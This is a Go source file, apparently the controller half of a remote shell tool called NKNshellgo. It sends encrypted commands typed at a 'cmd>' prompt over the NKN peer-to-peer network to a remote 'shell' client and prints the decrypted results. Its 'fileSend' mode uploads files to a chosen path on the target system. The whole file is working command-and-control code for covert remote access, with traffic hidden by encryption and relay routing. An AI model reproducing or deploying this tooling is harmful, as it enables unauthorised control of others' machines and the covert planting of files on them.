package main

import (
	"NKNshellgo/config"
	"NKNshellgo/module/cipher"
	"NKNshellgo/module/fileSender"
	"NKNshellgo/module/stringReplace"
	"bufio"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/liudng/godump"
	nkn "github.com/nknorg/nkn-sdk-go"
	"log"
	"os"
	"strings"
	"time"
)

var clientConf *nkn.ClientConfig

func setConfig() {
	clientConf = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              4096,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
}

func main() {
	setConfig()
	var account *nkn.Account
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("start!!!")
	//fmt.Println("Do You want to create a new account(yes/no):")
	var wantNewSeed string
	var encrypteType string
	flag.StringVar(&wantNewSeed, "n", "default", "new")
	flag.StringVar(&encrypteType, "e", "default", "encrypt")
	flag.Parse()
	//新建一个账户
	if wantNewSeed != "default" {
		account, _ = nkn.NewAccount(nil)
		fmt.Println(hex.EncodeToString(account.Seed()))
	} else { //使用默认配置
		seed, _ := hex.DecodeString(config.SeedId)
		account, _ = nkn.NewAccount(seed)
	}

	//创建一个发送方客户端
	client, _ := nkn.NewMultiClient(account, hex.EncodeToString([]byte(config.ClientID)), 4, false, clientConf)
	//server, _ := nkn.NewMultiClient(account, hex.EncodeToString([]byte(config.ShellID)), 4, false, clientConf)
	//延时处理语句，函数执行完毕后执行
	clientAddr := client.Address()
	defer func(client *nkn.MultiClient) {
		_ = client.Close()
	}(client)

	//获取shell的地址
	shellID := hex.EncodeToString([]byte(config.ShellID))
	index := strings.Index(clientAddr, ".")
	temp := clientAddr[index:]
	shellAddr := shellID + temp
	fmt.Println(shellAddr)
	//从键盘接收传输文本
	//发送消息到对方
	fmt.Println("可以开始输入cmd...")
	for true {
		fmt.Println("cmd>")
		message, _ := reader.ReadString('\n')
		//fmt.Println(message)
		//log.Println("Send message from", client.Address(), "to", string(address.Data), "content", message)
		//如果输入fileSend就会开启文件传输功能
		message = stringReplace.RemoveEnd(message)
		if message == "fileSend" {
			//先向shell发送一个文件发送的指令fileSend,一遍与shell进入文件接收状态
			message = hex.EncodeToString(cipher.CipherEncode(message, encrypteType))
			//接收来自shell的加密响应
			onReply, _ := client.Send(nkn.NewStringArray(shellAddr), message, nil)
			reply := <-onReply.C
			cipherResult, _ := hex.DecodeString(string(reply.Data))
			result := cipher.CipherDecode(cipherResult, encrypteType)
			fmt.Println(result)
			//结果为OK表示shell已经准备就绪了可以发送
			result = stringReplace.RemoveEnd(result)
			godump.Dump(result)
			//按照shell端要求提供保存目录
			if result == "savePath" {
				fmt.Print("请输入文件绝对路径:")
				filepath, _ := reader.ReadString('\n')
				filepath = stringReplace.RemoveEnd(filepath)
				//发送文件在目标系统保存位置
				fmt.Print("请输入文件在目标系统上的存储位置:")
				savePath, _ := reader.ReadString('\n')
				savePath = stringReplace.RemoveEnd(savePath)
				savePath = hex.EncodeToString(cipher.CipherEncode(savePath, encrypteType))
				onReply, _ = client.Send(nkn.NewStringArray(shellAddr), savePath, nil)
				reply = <-onReply.C
				cipherResult, _ = hex.DecodeString(string(reply.Data))
				result = cipher.CipherDecode(cipherResult, encrypteType)
				result = stringReplace.RemoveEnd(result)
				if result == "ok" {
					fileSender.SendFile(filepath, client, shellAddr, encrypteType)
				} else {
					log.Println("savePath send failed!")
				}
			} else {
				log.Println("Shell no respond!")
			}
		} else {
			//加密命令并且发送
			fmt.Println(hex.EncodeToString(cipher.CipherEncode(message, encrypteType)))
			message = hex.EncodeToString(cipher.CipherEncode(message, encrypteType))
			onReply, _ := client.Send(nkn.NewStringArray(shellAddr), message, nil)

			//发送方接收到的回复信息，从回复通道中取出结果
			reply := <-onReply.C
			//解密消息并输出
			cipherResult, _ := hex.DecodeString(string(reply.Data))
			result := cipher.CipherDecode(cipherResult, encrypteType)
			log.Println(">\n" + result)
			time.Sleep(time.Second)
		}
	}
}
